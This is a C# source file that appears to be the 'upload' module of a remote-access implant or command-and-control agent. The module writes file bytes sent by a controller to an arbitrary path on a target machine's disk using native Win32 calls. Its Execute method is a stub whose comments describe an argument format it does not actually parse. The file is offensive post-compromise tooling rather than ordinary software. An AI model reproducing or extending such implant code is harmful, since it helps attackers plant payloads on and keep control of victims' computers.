using System;
using System.Text;
using Agent.Interop;

namespace Agent.NativeModules
{
    /// <summary>
    /// Write file to target disk using CreateFileW/WriteFile.
    /// The payload contains file bytes; arguments contain the remote path.
    /// </summary>
    public class FileUploadModule : INativeModule
    {
        public string Name { get { return "upload"; } }
        public string Description { get { return "Upload file to target"; } }

        public byte[] Execute(byte[] arguments)
        {
            // For upload, the task dispatcher passes:
            //   payload = file bytes (from Task.Payload)
            //   arguments = remote path (from Task.Arguments)
            // But through the native module interface, we receive arguments only.
            // The shell packs it as: [4B path_len][path_bytes][file_bytes]

            if (arguments == null || arguments.Length < 5)
                return Encoding.UTF8.GetBytes("[!] Usage: upload <local> <remote>");

            // Parse: first 4 bytes = path length, then path, then file data
            // Simplified: arguments is just the remote path for now
            // File data comes via task payload (handled by controller)
            string remotePath = Encoding.UTF8.GetString(arguments).Trim('\0').Trim();

            return Encoding.UTF8.GetBytes(string.Format(
                "[*] Upload target path: {0} (awaiting payload from controller)", remotePath));
        }

        /// <summary>
        /// Direct write method called by the controller with both path and data.
        /// </summary>
        public byte[] WriteFile(string remotePath, byte[] fileData)
        {
            IntPtr hFile = Kernel32.CreateFileW(
                remotePath,
                Kernel32.GENERIC_WRITE,
                0, // no sharing during write
                IntPtr.Zero,
                Kernel32.CREATE_ALWAYS,
                0,
                IntPtr.Zero);

            if (hFile == Kernel32.INVALID_HANDLE_VALUE)
            {
                return Encoding.UTF8.GetBytes(string.Format(
                    "[!] Cannot create '{0}': error {1}",
                    remotePath, System.Runtime.InteropServices.Marshal.GetLastWin32Error()));
            }

            try
            {
                uint bytesWritten;
                if (!Kernel32.WriteFile(hFile, fileData, (uint)fileData.Length,
                    out bytesWritten, IntPtr.Zero))
                {
                    return Encoding.UTF8.GetBytes(string.Format(
                        "[!] WriteFile failed: error {0}",
                        System.Runtime.InteropServices.Marshal.GetLastWin32Error()));
                }

                return Encoding.UTF8.GetBytes(string.Format(
                    "[*] Uploaded {0} bytes to {1}", bytesWritten, remotePath));
            }
            finally
            {
                Kernel32.CloseHandle(hFile);
            }
        }
    }
}
